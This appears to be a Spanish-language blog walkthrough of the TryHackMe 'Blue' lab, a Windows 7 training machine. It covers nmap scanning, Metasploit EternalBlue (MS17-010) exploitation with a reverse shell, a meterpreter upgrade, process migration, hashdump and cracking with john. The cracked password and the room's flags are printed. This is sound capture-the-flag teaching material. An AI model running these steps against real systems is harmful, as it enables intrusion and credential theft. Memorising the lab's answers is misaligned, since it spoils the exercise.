---
layout: single
title: Blue - TryHackMe
excerpt: "En esta ocasion estaremos resolviendo una maquina windows 7 donde tendremos que explotar una vulnerabilidad muy conocida que es el EternalBlue donde tendremos que usar nmap para detectar que es vulnerable y ademas vamos a usar metasploit ya que en el room nos piden usarlo para poder aprender y practicar a usar esta herramienta"
date: 2023-03-24
classes: wide
header:
  teaser: /assets/images/try-writeup-blue/icon.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
  - infosec
tags:  
  - EternalBlue
---
<p align="center">
<img src="/assets/images/try-writeup-blue/icon.png">
</p>

```bash
❯ ping -c 1 10.10.15.188
PING 10.10.15.188 (10.10.15.188) 56(84) bytes of data.
64 bytes from 10.10.15.188: icmp_seq=1 ttl=125 time=276 ms

--- 10.10.15.188 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 276.009/276.009/276.009/0.000 ms
❯ whichSystem.py 10.10.15.188

10.10.15.188 (ttl -> 125): Windows

```

## PortScan

```bash
❯ sudo nmap -sCV -p135,139,445,3389 10.10.15.188 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 12:29 CST
Nmap scan report for 10.10.15.188
Host is up (0.26s latency).

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  tcpwrapped
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-03-24T13:29:26-05:00
| smb2-time: 
|   date: 2023-03-24T18:29:26
|_  start_date: 2023-03-24T18:26:13
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 028e5a48db87 (unknown)
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
```

En esta maquina vamos a tener que explotar la vulnerabilidad del `Eternablue` asi que tenemos que comprobar si es vulnerable tengo un repositorio en `Github` donde exploto el `EternalBlue` sin usar `Metasploit` en este caso tendremos que usarlo para completar el room y sirve que practicamos y aprendemos a usar esta herramienta

<a href='https://github.com/MikeRega7/How-to-exploit-the-EternalBlue-vulnerability-without-Metasploit' style='color: yellow'>Click para ver como explotar el EternalBlue sin utilizar Metasploit</a>

Estamos ante un `Windows 7`

```bash
❯ crackmapexec smb 10.10.15.188
SMB         10.10.15.188    445    JON-PC           [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:JON-PC) (domain:Jon-PC) (signing:False) (SMBv1:True)Type/Paste Your Code
```

Y bueno `Nmap` ya nos reporta que es vulnerable

```bash
❯ sudo nmap -sCV -p135,139,445,3389 --script "vuln and safe" 10.10.15.188 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 12:37 CST
Nmap scan report for 10.10.15.188
Host is up (0.22s latency).

PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  tcpwrapped
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

La vulnerabilidad que representa el `EternalBlue` es `ms17-010`

Otra forma de hacer el escaneo es esta

```bash
❯ sudo nmap -p 445 --script "vuln and safe" 10.10.15.188
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-24 12:48 CST
Nmap scan report for 10.10.15.188
Host is up (0.22s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

![](/assets/images/try-writeup-blue/Task1.png)

## Gain Access

Vamos a empezar corriendo el `Metasploit`

```bash
❯ msfconsole
Calling `DidYouMean::SPELL_CHECKERS.merge!(error_name => spell_checker)' has been deprecated. Please call `DidYouMean.correct_error(error_name, spell_checker)' instead.
                                                  
 ______________________________________
/ it looks like you're trying to run a \
\ module                               /
 --------------------------------------
 \
  \
     __
    /  \
    |  |
    @  @
    |  |
    || |/
    || ||
    |\_/|
    \___/


       =[ metasploit v6.2.32-dev                          ]
+ -- --=[ 2274 exploits - 1192 auxiliary - 406 post       ]
+ -- --=[ 948 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View all productivity tips with the 
tips command
Metasploit Documentation: https://docs.metasploit.com/

[msf](Jobs:0 Agents:0) >> 
```

Ahora vamos a buscar la vulnerabilidad

```bash
[msf](Jobs:0 Agents:0) >> search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

[msf](Jobs:0 Agents:0) >> 
```

Vamos a usar el siguiente

```bash
[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >>
```

Vamos a poner la ip de la maquina victima

```bash
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set RHOST 10.10.15.188
RHOST => 10.10.15.188
```

Vamos a añadir esto

```bash
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> 
```

Algo muy importante pon el LHOST tu ip de atacante de la VPN

```bash
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set LHOST IP
LHOST => IP
```

Ganamos acceso

```bash
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run

[*] Started reverse TCP handler on 10.2.28.226:4444 
[*] 10.10.15.188:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.15.188:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.15.188:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.15.188:445 - The target is vulnerable.
[*] 10.10.15.188:445 - Connecting to target for exploitation.
[+] 10.10.15.188:445 - Connection established for exploitation.
[+] 10.10.15.188:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.15.188:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.15.188:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.15.188:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.15.188:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.15.188:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.15.188:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.15.188:445 - Sending all but last fragment of exploit packet
[*] 10.10.15.188:445 - Starting non-paged pool grooming
[+] 10.10.15.188:445 - Sending SMBv2 buffers
[+] 10.10.15.188:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.15.188:445 - Sending final SMBv2 buffers.
[*] 10.10.15.188:445 - Sending last fragment of exploit packet!
[*] 10.10.15.188:445 - Receiving response from exploit packet
[+] 10.10.15.188:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.15.188:445 - Sending egg to corrupted connection.
[*] 10.10.15.188:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.15.188
[*] Command shell session 1 opened (10.2.28.226:4444 -> 10.10.15.188:49235) at 2023-03-24 13:03:39 -0600
[+] 10.10.15.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.15.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.15.188:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

![](/assets/images/try-writeup-blue/Task2.png)

## Escalate

Nos piden que hagamos `CTRL+Z`

```bash
C:\Windows\system32>^Z
Background session 1? [y/N]  y
[msf](Jobs:0 Agents:1) exploit(windows/smb/ms17_010_eternalblue) >> 
```

```bash
[msf](Jobs:0 Agents:1) exploit(windows/smb/ms17_010_eternalblue) >> search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

[msf](Jobs:0 Agents:1) exploit(windows/smb/ms17_010_eternalblue) >> use 0
[msf](Jobs:0 Agents:1) post(multi/manage/shell_to_meterpreter) >> 
```

Tenemos una sesion activa

```bash
[msf](Jobs:0 Agents:1) post(multi/manage/shell_to_meterpreter) >> sessions -l

Active sessions
===============

  Id  Name  Type               Information                                     Connection
  --  ----  ----               -----------                                     ----------
  1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7  10.2.28.226:4444 -> 10.10.15.188:49235 (10.10.1
                               601] -----                                      5.188)

[msf](Jobs:0 Agents:1) post(multi/manage/shell_to_meterpreter) >> 
```

```bash
[msf](Jobs:0 Agents:1) post(multi/manage/shell_to_meterpreter) >> set SESSION 1
SESSION => 1
```

Si no te funciona tienes que hacer otra vez los pasos yo lo tuve que hacer 2 veces

```bash
[msf](Jobs:0 Agents:1) post(multi/manage/shell_to_meterpreter) >> run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.2.28.226:4433 
[*] Post module execution completed
[msf](Jobs:1 Agents:1) post(multi/manage/shell_to_meterpreter) >> 
[*] Sending stage (200774 bytes) to 10.10.15.188
[*] Meterpreter session 2 opened (10.2.28.226:4433 -> 10.10.15.188:49273) at 2023-03-24 13:38:51 -0600
[*] Stopping exploit/multi/handler
ENTER
```

Hay tenemos la 2 sesion creada

```bash
[msf](Jobs:0 Agents:2) post(multi/manage/shell_to_meterpreter) >> sessions -l

Active sessions
===============

  Id  Name  Type                     Information                                  Connection
  --  ----  ----                     -----------                                  ----------
  1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.  10.2.28.226:4444 -> 10.10.15.188:49270 (10.1
                                     1.7601] -----                                0.15.188)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                 10.2.28.226:4433 -> 10.10.15.188:49273 (10.1
                                                                                  0.15.188)

[msf](Jobs:0 Agents:2) post(multi/manage/shell_to_meterpreter) >> 
```

```bash
[msf](Jobs:0 Agents:2) post(multi/manage/shell_to_meterpreter) >> sessions 2
[*] Starting interaction with 2...

(Meterpreter 2)(C:\Windows\system32) > 
```

Para obtener una shell solo hacemos esto 

```bash
(Meterpreter 2)(C:\Windows\system32) > shell
Process 612 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

![](/assets/images/try-writeup-blue/Task3.png)

## Cracking

En el room nos piden usar al shell de meterpreter

```bash
C:\Windows\system32>exit
exit
(Meterpreter 2)(C:\Windows\system32) > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 356   716   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 396   668   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 460   716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 572   564   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 620   564   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 628   612   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 668   612   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 716   620   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 724   620   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 728   716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 732   620   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 844   716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 912   716   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 960   716   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1020  572   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1128  716   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1228  716   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1260  2956  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\pow
                                                                                ershell.exe
 1372  716   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1456  2276  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 1472  716   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.e
                                                                                xe
 1532  716   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1664  716   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Co
                                                                                nfig.exe
 1720  716   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 1824  572   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1984  716   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2132  844   WmiPrvSE.exe
 2176  716   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2276  716   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2620  716   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2712  716   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2784  716   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM

(Meterpreter 2)(C:\Windows\system32) > 
```

Tenemos que migrar a un proceso que este corriendo

```bash
(Meterpreter 2)(C:\Windows\system32) > migrate 620
[*] Migrating from 1260 to 620...
[*] Migration completed successfully.
(Meterpreter 2)(C:\Windows\system32) > 
```

Tenemos los hashes

```bash
(Meterpreter 2)(C:\Windows\system32) > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
(Meterpreter 2)(C:\Windows\system32) > 
```

Vamos a crackear la contraseña de `Jon`

```bash
❯ cat hash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: hash
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Jon:ffb43f0de35be4d9917ac0cc8ad57f8d
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

```bash
❯ john --format=NT -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)
1g 0:00:00:00 DONE (2023-03-24 13:54) 1.449g/s 14783Kp/s 14783Kc/s 14783KC/s alr19882006..alpis3092
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
❯ john --show --format=NT hash
Jon:alqfna22

1 password hash cracked, 0 left
```

![](/assets/images/try-writeup-blue/Task4.png)

## Find flags

```bash
(Meterpreter 2)(C:\Windows\system32) > search -f flag*.txt
Found 3 results...
==================

Path                                  Size (bytes)  Modified (UTC)
----                                  ------------  --------------
c:\Users\Jon\Documents\flag3.txt      37            2019-03-17 13:26:36 -0600
c:\Windows\System32\config\flag2.txt  34            2019-03-17 13:32:48 -0600
c:\flag1.txt                          24            2019-03-17 13:27:21 -0600

(Meterpreter 2)(C:\Windows\system32) > 
```

```bash
(Meterpreter 2)(C:\) > cat flag1.txt 
flag{access_the_machine}
(Meterpreter 2)(C:\) > 
```

```bash
(Meterpreter 2)(C:\Windows\System32\config) > cat flag2.txt
flag{sam_database_elevated_access}
(Meterpreter 2)(C:\Windows\System32\config) > 
```

```bash
(Meterpreter 2)(C:\Users\Jon\Documents) > cat flag3.txt
flag{admin_documents_can_be_valuable}
(Meterpreter 2)(C:\Users\Jon\Documents) > 
```

![](/assets/images/try-writeup-blue/Task5.png)
